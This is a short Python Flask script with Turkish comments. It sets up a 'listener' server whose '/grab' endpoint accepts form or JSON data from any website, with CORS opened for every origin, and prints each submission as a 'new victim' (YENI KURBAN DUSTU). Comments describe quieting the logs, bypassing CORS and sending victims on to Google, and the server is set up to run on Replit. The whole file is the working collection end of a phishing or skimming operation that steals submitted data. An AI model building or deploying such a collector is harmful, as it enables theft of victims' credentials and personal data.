from flask import Flask, request, jsonify
from flask_cors import CORS # Güvenlik duvarını kaldırmak için
import logging

# Logları temizle
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
# Tüm sitelerden gelen isteklere izin ver (CORS Bypass)
CORS(app) 

@app.route('/')
def home():
    return "<h1>ERENBABA LISTENER AKTIF</h1><p>Veri bekleniyor...</p>", 200

@app.route('/grab', methods=['POST'])
def grab():
    # Gelen veriyi yakala
    print("\n[+] --- YENI KURBAN DUSTU! ---")
    
    # Form verisi mi JSON mu kontrol et
    if request.form:
        data = request.form.to_dict()
    elif request.json:
        data = request.json
    else:
        data = "Veri okunamadı"

    print(f"[*] Gelen Veri: {data}")
    print("[+] --------------------------\n")
    
    # Kurbanı Google'a yönlendirecek cevap
    return "Basarili", 200

if __name__ == '__main__':
    # Replit genelde 0.0.0.0 ve 8080 veya 3000 portunu sever
    app.run(host='0.0.0.0', port=8080)